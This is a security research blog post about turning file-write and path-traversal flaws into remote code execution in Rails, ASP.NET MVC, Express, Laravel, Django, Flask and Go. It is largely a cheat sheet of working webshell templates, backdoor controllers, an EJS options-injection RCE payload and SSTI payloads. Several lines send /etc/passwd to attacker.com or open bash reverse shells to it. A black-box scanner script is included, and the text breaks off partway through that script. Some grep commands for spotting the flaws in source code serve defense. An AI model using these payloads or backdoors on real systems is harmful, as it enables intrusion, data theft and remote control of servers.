---
layout: post
title: Write Path Traversal to a RCE Art Department
author: Diyan Apostolov
date: 2025-11-28
tags: [Write Path Traversal, RCE, Ruby, Express, Laravel, Django, Flask, GoLang]
profile_picture: /assets/images/fsi.jpg
handle: fsi
social_links: [https://x.com/thefosi]
description: "Abusing Write Path Traversal for Living Off the Land Remote Code Execution"
permalink: /research/write-path-traversal-to-RCE-art-department
---

CriticalThinking Research members are treated as artists thus here is my small and rare moment of sharing publicly thoughts, insides and art. In the modern world, it is common people to hide, to hide knowledge, to hide thoughts, to hide from life, but in the CT community, we do opposite, we can share what we know, what we feel, what we think, what we critically think! [Play](https://youtu.be/NCNRKev5tq4) that music and enjoy the process of sharing!

**Things will be discovered and patched so... Share!**

In our previous article - [ASP.NET MVC View Engine Search Patterns](https://lab.ctbb.show/research/asp-net-mvc-view-engine-search-patterns), we explored the inner workings and logic behind ASP.NET MVC search patterns. Building on that foundation and the shared understanding we've now established, today we'll dive deeper into more languages.

As pentesters, bug bounty hunters,...(whoever consider yourself)., we're constantly confronted with new programming languages, frameworks, and technologies — it's absolute chaos out there (especially when you're pushing 40 and still fondly remember the golden era of BBSs and blazing-fast 33.6K modems 😄).

This article takes a closer look at how Ruby resolves templates, examines the underlying behavior, and includes a practical comparison matrix/cheatsheet showing how different languages and frameworks handle similar view/template resolution mechanisms. The matrix is designed to expand over time with additional languages

For those short on time, feel free to jump straight to the Cheat Sheet - The Short Version section below — it has everything you need at a glance.
For everyone else, grab a coffee and enjoy the full read!


### [Cheat Sheet - Quick Comparison Table](https://gist.github.com/apostolovd/797b434be416bf24588977701b59e859)

# Rails Wildcard Routing & Auto-loading: Exploitation Guide

## Introduction
Similar to ASP.NET MVC's View Engine search pattern vulnerability, Ruby on Rails has an analogous attack surface through the combination of **wildcard routing**, **Zeitwerk auto-loading**, and **implicit rendering**. Both vulnerabilities exploit framework-level file resolution mechanisms that bypass web server protections.
## Part 1: Understanding Rails Auto-loading with Zeitwerk
### The Convention-Over-Configuration Pattern
Rails follows strict naming conventions where **file paths automatically map to class names**:

```ruby
# File: app/controllers/users_controller.rb
class UsersController < ApplicationController
	def index
	# ...
	end
end
```

The Zeitwerk loader uses `String#camelize` to convert file paths to constants:

File Path -> Constant Name
```
app/controllers/users_controller.rb -> UsersController
app/controllers/admin/payments_controller.rb -> Admin::PaymentsController
app/models/user.rb -> User
app/services/payment_processor.rb -> PaymentProcessor
```
### How Zeitwerk Auto-loading Works
When your Rails application references an undefined constant, Zeitwerk intercepts it:

```ruby
# Somewhere in your Rails app
user = User.new # If User is not yet loaded...
```

**Behind the scenes:**
1. Ruby raises `NameError: uninitialized constant User`
2. Zeitwerk intercepts this error
3. Converts `User` → `user.rb` (reverse camelize)
4. Searches autoload paths: `app/models/user.rb`
5. **Executes the file** using `require`
6. The constant `User` is now defined
7. Execution continues normally

**Critical insight:** This happens automatically without explicit `require` statements, and the file is **executed** when loaded.
### Autoload Paths
Rails automatically configures these directories as autoload paths:

```
app/controllers/
app/models/
app/helpers/
app/mailers/
app/jobs/
app/services/
lib/
```

Any `.rb` file in these directories can be auto-loaded based on naming conventions.
## Part 2: Rails Routing & Implicit Rendering

### Basic Routing

Rails routes map URLs to controller actions:
```ruby
# config/routes.rb
Rails.application.routes.draw do
	get '/users', to: 'users#index'
	get '/users/:id', to: 'users#show'
end
```

This maps:
- `GET /users` → `UsersController#index`
- `GET /users/123` → `UsersController#show` with `params[:id] = "123"`
### Wildcard/Globbing Routes

Rails supports **glob parameters** that capture everything including slashes:
```ruby
# config/routes.rb
get '/files/*path', to: 'files#show'
```

Request: `GET /files/documents/2024/report.pdf`
- `params[:path]` = `"documents/2024/report.pdf"` (includes slashes!)
### Implicit Rendering

If a controller action doesn't explicitly render something, Rails automatically looks for a template:
```ruby
class UsersController < ApplicationController
	def profile
		# No explicit render call
		# Rails automatically renders: app/views/users/profile.html.erb
	end
end
```

The implicit render searches for templates matching the pattern:
```
app/views/<controller_name>/<action_name>.<format>.<engine>
```
## Part 3: The Vulnerability - CVE-2014-0130

### Vulnerable Configuration

The vulnerability occurs when applications use **wildcard routing with the `:action` parameter**:

```ruby
# config/routes.rb - VULNERABLE
get '/render/*action', to: 'pages#'
# or
get '/docs/*action', controller: 'documentation'
```

This routing pattern tells Rails:
- Match any URL starting with `/render/`
- Capture everything after as the `:action` parameter
- Route to the specified controller

### Why This Is Dangerous

When you combine:

1. Wildcard routes capturing `:action`
2. Implicit rendering
3. Directory traversal sequences (`../`)

Rails will:
1. Accept the action parameter with traversal sequences
2. Try to render a template using that action name
3. **Not properly sanitize the path**

### Exploitation Example 1: File Disclosure

**Vulnerable Application:**
```ruby
# config/routes.rb
Rails.application.routes.draw do
	get '/pages/*action', controller: 'pages'
end

# app/controllers/pages_controller.rb
class PagesController < ApplicationController
	# Relies on implicit rendering
	# No action methods defined - all handled by implicit render
end
```

**Attack Request:**
```http
GET /pages/../../../../etc/passwd HTTP/1.1
Host: vulnerable-app.com
```

**What Happens:**
1. Rails routes to `PagesController`
2. `params[:action]` = `"../../../../etc/passwd"`
3. Implicit render looks for template: `app/views/pages/../../../../etc/passwd`
4. Path traversal resolves to `/etc/passwd`
5. **File contents disclosed** (if Rails can read it)

### Exploitation Example 2: Code Execution via Template Injection

**Attack Scenario:**
Assume the attacker has **file write access** via another vulnerability (upload, path traversal in a different endpoint, etc.)

**Step 1: Write malicious ERB template**
Attacker uploads a file to a predictable location:
```erb
<!-- Attacker writes to: public/uploads/evil.html.erb -->
<%= `whoami` %>
<%= system("curl http://attacker.com/?data=$(cat /etc/passwd | base64)") %>
```
  
**Step 2: Trigger via wildcard route**
```ruby
# config/routes.rb - VULNERABLE
get '/render/*action', controller: 'pages'
```

**Attack Request:**
```http
GET /render/../../public/uploads/evil.html HTTP/1.1
Host: vulnerable-app.com
```

**Exploitation Chain:**

1. Rails accepts `action = "../../public/uploads/evil.html"`
2. Implicit render searches for: `app/views/pages/../../public/uploads/evil.html.erb`
3. Path resolves to: `public/uploads/evil.html.erb`
4. Rails **loads and executes the ERB template**
5. Embedded Ruby code (`<%= system(...) %>`) executes with app privileges
6. Remote code execution achieved

## Part 4: Zeitwerk Auto-loading Attack Surface

### Controller Auto-loading Vulnerability
While less common, if an application uses **wildcard routing with `:controller`**:

```ruby
# config/routes.rb - EXTREMELY DANGEROUS
get '/:controller/:action/:id'
```

This creates an even worse attack surface.
**Example Attack:**

```http
GET /admin%2F%2Fevil_controller/malicious_action/1 HTTP/1.1
```

If an attacker can:
1. Write a file to `app/controllers/admin/evil_controller.rb`
2. Trigger the route

Then:
1. Zeitwerk auto-loads `Admin::EvilController`
2. The malicious controller code **executes**
3. Actions in that controller become accessible

### Malicious Controller Example
**Attacker writes to: `app/controllers/admin/evil_controller.rb`**

```ruby
class Admin::EvilController < ApplicationController
	skip_before_action :verify_authenticity_token
	def backdoor
		if params[:cmd]
			render plain: `#{params[:cmd]}`
		else
			render plain: "Backdoor ready"
		end
	end
end
```
  
**Attack Request:**
```http

GET /admin%2Fevil_controller/backdoor?cmd=whoami HTTP/1.1

```

**Result:** Remote command execution.

## Part 5: Real-World Examples
### Example 1: Rails App with Dynamic Pages

**Vulnerable Code:**
```ruby
# config/routes.rb
Rails.application.routes.draw do
	# Intention: Allow dynamic page rendering
	get '/help/*page', controller: 'help', action: 'show'
end

# app/controllers/help_controller.rb
class HelpController < ApplicationController
	def show
		@page = params[:page]
		# Implicit render looks for: app/views/help/show.html.erb
		# But what if action method doesn't exist and we use wildcard action?
	end
end
```

**Better vulnerable example:**
```ruby
# config/routes.rb
get '/help/*action', controller: 'help'
# app/controllers/help_controller.rb
class HelpController < ApplicationController
	# No methods - relies on implicit rendering
end
```

**Directory Structure:**
```
app/views/help/
faq.html.erb
getting-started.html.erb
tutorials.html.erb
```

**Legitimate Request:**
```http
GET /help/faq
```

Renders: `app/views/help/faq.html.erb` ✓

**Malicious Request:**

```http
GET /help/../../../../config/database.yml
```

Attempts to render: `app/views/help/../../../../config/database.yml`
Resolves to: `config/database.yml`
**Result:** Database credentials disclosed!
### Example 2: File Upload + Wildcard Route RCE

**Scenario:** Application has file upload but "restricts" to images only (client-side validation)

**Step 1: Upload malicious ERB disguised as image**
```http
POST /uploads HTTP/1.1

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: image/jpeg

<%= system("bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'") %>
------WebKitFormBoundary--
```

File saved to: `public/uploads/avatar.jpg`

**Step 2: Rename/copy to .erb extension** (via path traversal in another endpoint, or if predictable naming). Or attacker finds the app also accepts `.erb` files in certain directories. However. this step is actually **optional** in some cases. Rails might still process the file as ERB if:
  - The implicit render path resolves to it
  - Rails is configured to handle that extension
  - The file contains ERB delimiters <%= %>

For reliability purposes, the attacker would typically need the .erb extension or Rails won't treat it as an ERB template.

**Step 3: Trigger via wildcard route**

```ruby
# If app has this route:
get '/render/*action', controller: 'pages'
```

```http
GET /render/../../public/uploads/avatar.jpg HTTP/1.1
```

If Rails treats this as a template, the embedded Ruby executes → **Reverse shell**.

### Example 3: Auto-loading + Malicious Controller

**Scenario:** App has arbitrary file write via path traversal in a separate vulnerability

**Step 1: Write malicious controller**
```http
PUT /api/files?path=../../app/controllers/backdoor_controller.rb HTTP/1.1
class BackdoorController < ApplicationController
	def shell
		render plain: `#{params[:cmd]}`
	end
end
```

**Step 2: Trigger auto-loading**
```ruby
# If app has wildcard controller routing:
match ':controller/:action', via: :all
```

```http
GET /backdoor/shell?cmd=cat%20/etc/passwd HTTP/1.1
```

**Result:**
1. Rails routes to `BackdoorController#shell`
2. Zeitwerk auto-loads `app/controllers/backdoor_controller.rb`
3. Controller class is **defined and instantiated**
4. `shell` action executes with command injection
5. RCE achieved

## Part 6: Detection

How we can identify if there is a wildcard endpoints? There a couple techniques which we can use to identify a possible vulnerable endpoint

### Path Traversal Probing (Best Method)

Test if path traversal works in different URL segments
```
curl -i https://target.com/pages/test
curl -i https://target.com/pages/../test
curl -i https://target.com/pages/../../test
curl -i https://target.com/pages/../../../../etc/passwd
```

Look for:
- Different responses (200 vs 404 vs 500)
- File disclosure in response body
- Error messages revealing file paths
- Response time differences


### Error Message Fingerprinting

Wildcard routes often produce distinctive Rails errors:
```
curl -i https://target.com/pages/nonexistent
```

Wildcard route indicators:
- Template is missing → Implicit rendering attempting to find template
- Missing template pages/nonexistent → Shows it's looking for a template with your input
- No route matches → Explicit routes only (no wildcard)

Example error that reveals wildcard routing:
ActionView::MissingTemplate: Missing template pages/../../../../etc/passwd

This confirms:
- Wildcard *action exists
- Path traversal sequences accepted
- Implicit rendering active


### Fuzz Common Wildcard Patterns

Test common Rails wildcard endpoints
```
curl -i https://target.com/render/test
curl -i https://target.com/pages/test
curl -i https://target.com/docs/test
curl -i https://target.com/help/test
curl -i https://target.com/content/test
```
Indicators:
- 200 OK or "Template missing" = likely wildcard
- 404 Not Found = likely explicit routing

### Directory Brute-forcing Behavior

Try random action names
```
curl -i https://target.com/pages/random123
curl -i https://target.com/pages/totally_fake_action
```

Wildcard route behavior:
- Returns Template is missing (tries to render)
- Returns 500 error (tries to find template)

Explicit route behavior:
- Returns 404 or routing error immediately
- Never mentions "template"

### Response Difference Analysis

Compare responses
```
curl -i https://target.com/pages/known_page    # Legitimate page
curl -i https://target.com/pages/fake_page     # Non-existent
curl -i https://target.com/pages/../fake       # Traversal attempt
```

Wildcard indicators:
- All return similar HTTP codes (500/200)
- Error messages reveal template paths
- Content-Type remains consistent

Non-wildcard indicators:
- Quick 404 responses
- Generic "not found" pages
- No mention of templates/views

### Timing Attack

Measure response times
```
time curl -s https://target.com/pages/test > /dev/null
time curl -s https://target.com/pages/../../../../etc/passwd > /dev/null
```

Wildcard routes with file system access will have:
- Longer response times (file system lookups)
- Variable timing based on path depth

### The "Golden Test" (Most Reliable)

```
curl -v https://target.com/pages/../../../../etc/passwd 2>&1 | grep -i "missing template\|passwd"
```

If wildcard route exists:
- Error: Missing template pages/../../../../etc/passwd
- Or: Actual /etc/passwd contents

If no wildcard:
- 404 Not Found or No route matches

Common Rails Wildcard Endpoints

Test these first:
```
/render/*
/pages/*
/docs/*
/help/*
/content/*
/api/*
/admin/*
```

## Part 7: Key Takeaways

Without wildcard routing, that specific CVE doesn't apply, and many developers/SOCs/.. are aware of it thus it is more rare to find it. If there's NO action or controller wildcard routing, the attack surface becomes much more constrained, but not zero!

### Exact Template Path Overwrites
```ruby
  # config/routes.rb - NO wildcards
  get '/users/profile', to: 'users#profile'
```

  **Attack scenario**:
  - Attacker has file-write capability via separate vulnerability
  - Writes malicious template to EXACT expected path: app/views/users/profile.html.erb
``` ruby
<%= system("curl http://attacker.com/?data=$(whoami)") %>
```
  
  - Request GET /users/profile
  - Rails renders the poisoned template → RCE

### Controller Auto-loading Without Wildcard Routes
 This is trickier. Modern Rails apps typically use explicit routes, so even if you write:
```ruby
# Attacker writes: app/controllers/backdoor_controller.rb
class BackdoorController < ApplicationController
	def evil
	  render plain: `#{params[:cmd]}`
	end
end
```
**Without a route pointing to it**, Rails won't route requests there. You'd need:
```ruby
# This route must exist for the attack to work
get '/backdoor/evil', to: 'backdoor#evil'
```
 So without wildcard routing OR existing routes to your malicious controller, Zeitwerk auto-loading alone doesn't help much.

### Modifying Existing Templates (Not Creating New Ones)
```ruby
  # Existing route
  get '/dashboard', to: 'home#dashboard'
```

If attacker can **modify** the existing template:
```ruby
<!-- app/views/home/dashboard.html.erb - MODIFIED -->
<h1>Dashboard</h1>
<%= system(params[:cmd]) if params[:cmd] %>  <!-- Attacker added this -->
```
Request: GET /dashboard?cmd=whoami → RCE,  but this requires modifying existing files, not just creating new ones.

### With Wildcard Routing (CVE-2014-0130):

get '/render/*action', controller: 'pages'
Attacker can:
- Write file ANYWHERE: public/uploads/evil.erb, /tmp/evil.erb, etc.
- Use path traversal in URL: GET /render/../../public/uploads/evil
- Rails resolves the path and renders it
- High flexibility in file placement

### Without Wildcard Routing:

get '/profile', to: 'users#profile'
Attacker must:
- Write file to EXACT location: app/views/users/profile.html.erb
- No path traversal possible via URL
- Much more constrained - needs to know exact route-to-template mapping
- Low flexibility - must predict exact paths

The wildcard routing is what makes it a "weaponized" vulnerability (CVE-worthy), but the fundamental framework behavior (auto-rendering templates) is still an attack surface even without wildcards.


# Cheat Sheet - The long version
## Cross-Framework Exploitation Guide

This cheatsheet covers how file-write vulnerabilities combined with path traversal can lead to Remote Code Execution (RCE) across different web frameworks by exploiting framework-level file resolution mechanisms.

---

## Quick Reference Table

| Framework           | File Extension       | Auto-Execution                | Wildcard Vuln            | Difficulty |
| ------------------- | -------------------- | ----------------------------- | ------------------------ | ---------- |
| **ASP.NET MVC**     | `.cshtml`            | Yes (Razor)                   | View Engine patterns     | Medium     |
| **Ruby on Rails**   | `.erb`, `.rb`        | Yes (ERB/Zeitwerk)            | `*action`, `*controller` | Medium     |
| **Node.js/Express** | `.ejs`, `.hbs`       | Yes (Template engines)        | View options injection   | Easy       |
| **PHP/Laravel**     | `.blade.php`, `.php` | Yes (Blade/Include)           | Route parameters         | Easy       |
| **Python/Django**   | `.py`, `.html`       | Partial (SSTI, `__init__.py`) | Template injection       | Hard       |
| **Python/Flask**    | `.py`, `.html`       | Partial (SSTI, `__init__.py`) | Template injection       | Hard       |
| **Go/Gin/Echo**     | `.tmpl`, `.html`     | No (Manual parse)             | SSTI gadgets             | Very Hard  |

---

## Step 1: Understanding Framework File Resolution

### ASP.NET MVC
```
View() → Searches: ~/Views/{Controller}/{Action}.cshtml
Uses: Internal File.Exists() → Bypasses IIS filtering
```

**Predictable Paths:**
- `~/Views/Home/Index.cshtml`
- `~/Views/Shared/_Layout.cshtml`
- `~/Areas/{Area}/Views/{Controller}/{Action}.cshtml`

**Example:**
```csharp
public ActionResult Profile()
{
    return View(); // Searches: ~/Views/Home/Profile.cshtml
}
```

---

### Ruby on Rails
```
Implicit Render → Searches: app/views/{controller}/{action}.{format}.erb
Zeitwerk Auto-loading → app/controllers/{name}_controller.rb → NameController
Uses: Framework file operations → Bypasses Rack/web server filtering
```

**Predictable Paths:**
- `app/views/users/profile.html.erb`
- `app/controllers/admin/users_controller.rb` → `Admin::UsersController`
- `app/models/user.rb` → `User`

**Example:**
```ruby
class UsersController < ApplicationController
  def profile
    # Implicit render: app/views/users/profile.html.erb
  end
end
```

---

### Node.js/Express
```
res.render('view', data) → Searches: views/{view}.{engine}
Uses: require() for engines → Bypasses static file serving
```

**Predictable Paths:**
- `views/index.ejs`
- `views/users/profile.hbs`
- `views/layouts/main.ejs`

**Example:**
```javascript
app.get('/profile', (req, res) => {
    res.render('profile', req.query); // Dangerous!
});
```

---

### PHP/Laravel
```
view('name') → Searches: resources/views/{name}.blade.php
Uses: include/require → Bypasses web server restrictions
```

**Predictable Paths:**
- `resources/views/welcome.blade.php`
- `resources/views/users/profile.blade.php`
- `app/Http/Controllers/UserController.php`

**Example:**
```php
public function profile()
{
    return view('users.profile'); // resources/views/users/profile.blade.php
}
```

---

### Python/Django
```
render(request, 'template.html') → Searches: templates/{template.html}
Auto-loading: Not by default (INSTALLED_APPS)
Uses: open() for templates
```

**Predictable Paths:**
- `templates/index.html`
- `app_name/templates/app_name/view.html`
- `{app}/__init__.py` (for code execution)

**Example:**
```python
def profile(request):
    return render(request, 'users/profile.html')
```

---

### Python/Flask
```
render_template('template.html') → Searches: templates/{template.html}
Uses: Jinja2 engine → Can exploit SSTI
```

**Predictable Paths:**
- `templates/index.html`
- `templates/users/profile.html`
- `{package}/__init__.py` (for code execution)

**Example:**
```python
@app.route('/profile')
def profile():
    return render_template('profile.html', user=request.args)
```

---

### Go/Gin/Echo
```
c.HTML(200, "template.html", data) → Must explicitly parse templates
No auto-loading → Must template.ParseFiles() first
Uses: Manual file operations
```

**Predictable Paths:**
- `templates/index.tmpl`
- `views/profile.html`
- Depends on developer configuration

**Example:**
```go
func profile(c *gin.Context) {
    c.HTML(200, "profile.html", gin.H{"user": c.Query("name")})
}
```

---

## Step 2: Wildcard/Dynamic Routing Vulnerabilities

### ASP.NET MVC
```csharp
// VULNERABLE - Catch-all route
routes.MapRoute(
    name: "CatchAll",
    url: "{controller}/{action}/{*path}"
);
```

**Attack Vector:** Controller/Action names with path traversal
**Exploitation:** View Engine searches can be manipulated

---

### Ruby on Rails
```ruby
# VULNERABLE - Wildcard action
get '/pages/*action', controller: 'pages'

# EXTREMELY DANGEROUS - Wildcard controller
get '/:controller/:action/:id'
```

**Attack Vector:** Direct path traversal via `*action` or `*controller`
**Exploitation:** `GET /pages/../../../../etc/passwd`

---

### Node.js/Express
```javascript
// VULNERABLE - User-controlled render options
app.get('/render/:page', (req, res) => {
    res.render(req.params.page, req.query); // req.query passed as options!
});
```

**Attack Vector:** Template engine options injection
**Exploitation:**
```
GET /render/profile?settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('calc');//
```

---

### PHP/Laravel
```php
// VULNERABLE - Dynamic view names
Route::get('/page/{name}', function ($name) {
    return view($name); // User-controlled view name!
});
```

**Attack Vector:** Direct view name control with path traversal
**Exploitation:** `GET /page/../../../../config/database`

---

### Python/Django
```python
# VULNERABLE - Dynamic template names
def render_page(request, template_name):
    return render(request, template_name)  # User-controlled!

urlpatterns = [
    path('page/<str:template_name>/', render_page),
]
```

**Attack Vector:** Path traversal in template name
**Exploitation:** `GET /page/../../../../etc/passwd`

---

### Python/Flask
```python
# VULNERABLE - User-controlled templates
@app.route('/page/<template>')
def render_page(template):
    return render_template(template)  # User-controlled!
```

**Attack Vector:** Path traversal in template name
**Exploitation:** `GET /page/../../../../etc/passwd`

---

### Go/Gin/Echo
```go
// VULNERABLE - User-controlled template data with SSTI
func renderPage(c *gin.Context) {
    tmpl := template.Must(template.New("page").Parse(c.Query("content")))
    tmpl.Execute(c.Writer, c)  // User-controlled template content!
}
```

**Attack Vector:** Server-Side Template Injection
**Exploitation:** SSTI payloads to read files via framework gadgets

---

## Step 3: Attack Prerequisites

| Framework | Requirement 1 | Requirement 2 | Requirement 3 |
|-----------|---------------|---------------|---------------|
| **ASP.NET MVC** | File-write capability | Path traversal to `~/Views/` | Trigger View() call |
| **Ruby on Rails** | File-write capability | Path traversal to `app/views/` or `app/controllers/` | Wildcard route OR exact route match |
| **Node.js/Express** | File-write capability OR | Options injection | Render call with user data |
| **PHP/Laravel** | File-write capability | Path traversal to `resources/views/` | Dynamic view() call |
| **Python/Django** | File-write to `__init__.py` | Path in PYTHONPATH | Module import trigger |
| **Python/Flask** | File-write to `__init__.py` OR | SSTI in template | Debug mode (for auto-reload) |
| **Go** | SSTI vulnerability | Framework context in template | Specific gadgets available |

---

## Step 4: Exploitation Payloads

### ASP.NET MVC - RCE via Razor Template

**Write to:** `~/Views/Home/Backdoor.cshtml`

```cshtml
@{
    var cmd = Request["cmd"];
    if (!string.IsNullOrEmpty(cmd))
    {
        var proc = System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = "/c " + cmd,
            RedirectStandardOutput = true,
            UseShellExecute = false
        });
        <pre>@proc.StandardOutput.ReadToEnd()</pre>
        proc.WaitForExit();
    }
}
```

**Trigger:** `GET /Home/Backdoor?cmd=whoami`

---

### Ruby on Rails - RCE via ERB Template

**Write to:** `app/views/pages/backdoor.html.erb`

```erb
<%= system(params[:cmd]) if params[:cmd] %>
<%= `#{params[:cmd]}` if params[:cmd] %>
```

**Trigger (with wildcard):** `GET /pages/backdoor?cmd=whoami`

**Or write to:** `app/controllers/backdoor_controller.rb`

```ruby
class BackdoorController < ApplicationController
  skip_before_action :verify_authenticity_token

  def shell
    render plain: `#{params[:cmd]}`
  end
end
```

**Trigger:** `GET /backdoor/shell?cmd=whoami` (requires route)

---

### Node.js/Express - RCE via EJS Options Injection

**No file write needed!** Just exploit render options:

```http
GET /profile?settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('curl http://attacker.com/?data=$(cat /etc/passwd|base64)');//
```

**Or write malicious template:** `views/backdoor.ejs`

```ejs
<%= process.mainModule.require('child_process').execSync(query.cmd).toString() %>
```

**Trigger:** `GET /backdoor?cmd=whoami`

---

### PHP/Laravel - RCE via Blade Template

**Write to:** `resources/views/backdoor.blade.php`

```php
@php
    if (isset($_GET['cmd'])) {
        system($_GET['cmd']);
    }
@endphp
```

**Or simpler:**

```php
<?php system($_GET['cmd']); ?>
```

**Trigger:** `GET /page/backdoor?cmd=whoami`

---

### Python/Django - RCE via `__init__.py` Overwrite

**Write to:** `{app}/__init__.py` or any package in PYTHONPATH

```python
import os
os.system('curl http://attacker.com/?data=$(whoami)')
```

**Trigger:** Any request that causes module import (or restart if debug mode)

**Alternative - SSTI (if template injection exists):**

```django
{​{ request.environ ​}​​​​}
{​{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate() ​}​​​​}
```

---

### Python/Flask - RCE via `__init__.py` Overwrite

**Write to:** Flask package `__init__.py` or app module

```python
import os
os.system('bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"')
```

**Trigger:** Restart or import (debug mode auto-reloads)

**Alternative - SSTI:**

```jinja2
​​{​{config.items() }​}
{​{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate() ​}​​​​}
{​{ request.environ.get('FLAG') ​}​​​​}
```

---

### Go/Gin - SSTI File Read (Not RCE)

**No file write needed if SSTI exists:**

```go
// Gin Framework SSTI
{​​{ $x:=.Gin.Context.Request ​}​​​​}{​{ $x.URL ​}​​​​}
```

**Echo Framework - Arbitrary File Read:**

```go
{​{ $x:=.Echo.Filesystem.Open "/etc/passwd" ​}​​​​}
{​{ .Stream 200 "text/plain" $x ​}​​​​}
```

**Note:** Go templates are sandboxed; RCE is extremely difficult without custom functions.

---

## Step 5: Detection - With Source Code Access

### ASP.NET MVC
```bash
# Find View() calls
grep -rn "return View()" --include="*.cs"

# Find catch-all routes
grep -rn "MapRoute.*\*" --include="*.cs"
```

---

### Ruby on Rails
```bash
# Find wildcard routes
grep -nE '\*(action|controller)' config/routes.rb

# Find implicit rendering (no render/redirect)
grep -A10 "def [a-z_]*$" app/controllers/*.rb | grep -v "render\|redirect"
```

---

### Node.js/Express
```bash
# Find render calls with user data
grep -rn "res.render.*req\." --include="*.js"

# Find dangerous patterns
grep -rn "res.render.*params\|res.render.*query" --include="*.js"
```

---

### PHP/Laravel
```bash
# Find dynamic view calls
grep -rn "view(\$" --include="*.php"

# Find user-controlled view names
grep -rn "view(request" --include="*.php"
```

---

### Python/Django
```bash
# Find dynamic template names
grep -rn "render(request,.*request\." --include="*.py"

# Find path parameters in views
grep -rn "def.*\(request,.*template" --include="*.py"
```

---

### Python/Flask
```bash
# Find render_template with user input
grep -rn "render_template.*request\." --include="*.py"

# Find route parameters used in rendering
grep -rn "@app.route.*<.*>.*render_template" --include="*.py"
```

---

### Go
```bash
# Find template parsing with user input
grep -rn "template.*Parse.*Query\|template.*Parse.*Param" --include="*.go"

# Find HTML rendering with user data
grep -rn "\.HTML.*Context\|\.HTML.*Request" --include="*.go"
```

---

## Step 6: Detection - WITHOUT Source Code (Black Box)

### ASP.NET MVC

**Fingerprinting:**
```bash
# Identify ASP.NET
curl -I https://target.com/
# Look for: X-AspNet-Version, X-AspNetMvc-Version
# Cookie: ASP.NET_SessionId
```

**Path Traversal Test:**
```bash
curl -i https://target.com/Home/../../test
curl -i https://target.com/Home/NonExistentAction

# Look for:
# - "The view 'NonExistentAction' or its master was not found"
# - Stack traces revealing view search paths
```

---

### Ruby on Rails

**Fingerprinting:**
```bash
# Identify Rails
curl -I https://target.com/
# Look for: X-Runtime, X-Request-Id
# Cookie: _rails_app_session
```

**Wildcard Detection:**
```bash
curl -i https://target.com/pages/test
curl -i https://target.com/pages/../../../../etc/passwd

# Look for:
# - "Template is missing"
# - "Missing template pages/../../../../etc/passwd"
# - "ActionView::MissingTemplate"
```

**One-liner:**
```bash
curl -i https://target.com/pages/../../../../etc/passwd 2>&1 | grep -i "missing template" && echo "[!] WILDCARD DETECTED"
```

---

### Node.js/Express

**Fingerprinting:**
```bash
# Identify Node.js/Express
curl -I https://target.com/
# Look for: X-Powered-By: Express
# Cookie: connect.sid
```

**Options Injection Test:**
```bash
curl -i "https://target.com/profile?settings[view%20options][outputFunctionName]=x"

# Look for:
# - 500 errors
# - JavaScript syntax errors in response
# - Different behavior than normal requests
```

**Template Error Probing:**
```bash
curl -i https://target.com/nonexistent
# Look for: "Error: Failed to lookup view" or EJS/Handlebars errors
```

---

### PHP/Laravel

**Fingerprinting:**
```bash
# Identify Laravel
curl -I https://target.com/
# Look for: Set-Cookie: laravel_session
# X-Powered-By: PHP

# Check for Laravel error pages
curl -i https://target.com/nonexistent
# Look for: "Illuminate\View\ViewException"
```

**Path Traversal Test:**
```bash
curl -i https://target.com/page/../../config/app

# Look for:
# - "View [...] not found"
# - Stack traces with view paths
```

---

### Python/Django

**Fingerprinting:**
```bash
# Identify Django
curl -I https://target.com/
# Look for: Set-Cookie: csrftoken, sessionid
# Django debug page styling (if debug=True)

curl -i https://target.com/nonexistent
# Look for: "TemplateDoesNotExist" error page
```

**SSTI Detection:**
```bash
# Test for template injection
curl "https://target.com/page?name={​{7*7​}​​​​}"

# Look for:
# - "49" in response (SSTI confirmed)
# - Django template syntax errors
```

---

### Python/Flask

**Fingerprinting:**
```bash
# Identify Flask
curl -I https://target.com/
# Look for: Set-Cookie: session (JWT format)
# Server: Werkzeug (if debug mode)

curl -i https://target.com/nonexistent
# Look for: Werkzeug debugger, Flask error pages
```

**SSTI Detection:**
```bash
# Test for Jinja2 SSTI
curl "https://target.com/?name={​{7*7​}​​​​}"
curl "https://target.com/?name={​{config​}​​​​}"

# Look for:
# - "49" in response
# - Config object dumped
# - Jinja2 syntax errors
```

---

### Go/Gin/Echo

**Fingerprinting:**
```bash
# Less distinctive headers, check response patterns
curl -I https://target.com/

# Gin might expose errors like:
# "template: ... :1: function "..." not defined"
```

**SSTI Detection:**
```bash
# Test for template injection
curl "https://target.com/?template={​{.​}​​​​}"
curl "https://target.com/?name={​{.Request​}​​​​}"

# Look for:
# - Go template syntax errors
# - Object structures in response
```

---

## Step 7: Automated Detection Scripts

### Multi-Framework Scanner

```bash
#!/bin/bash
# framework-vuln-scanner.sh

TARGET="$1"
OUTPUT="scan-results.txt"

echo "[*] Scanning $TARGET for file-write-to-RCE vulnerabilities" | tee $OUTPUT

# Test ASP.NET MVC
echo -e "\n[*] Testing ASP.NET MVC..." | tee -a $OUTPUT
curl -si "$TARGET/Home/NonExistent" | grep -i "view.*not found" && \
    echo "[!] ASP.NET MVC: Potential View Engine exposure" | tee -a $OUTPUT

# Test Rails
echo -e "\n[*] Testing Ruby on Rails..." | tee -a $OUTPUT
curl -si "$TARGET/pages/../../../../etc/passwd" | grep -i "missing template\|actionview" && \
    echo "[!] Rails: Wildcard routing detected!" | tee -a $OUTPUT

# Test Express
echo -e "\n[*] Testing Node.js/Express..." | tee -a $OUTPUT
curl -si "$TARGET/test?settings[view%20options][outputFunctionName]=x" 2>&1 | grep -i "error\|express" && \
    echo "[!] Express: Possible options injection vector" | tee -a $OUTPUT

# Test Laravel
echo -e "\n[*] Testing PHP/Laravel..." | tee -a $OUTPUT
curl -si "$TARGET/page/../../test" | grep -i "illuminate\|view.*not found" && \
    echo "[!] Laravel: View resolution exposure" | tee -a $OUTPUT

# Test Django
echo -e "\n[*] Testing Python/Django..." | tee -a $OUTPUT
curl -si "$TARGET/page?name={​{7*7​}​​​​}" | grep "49" && \
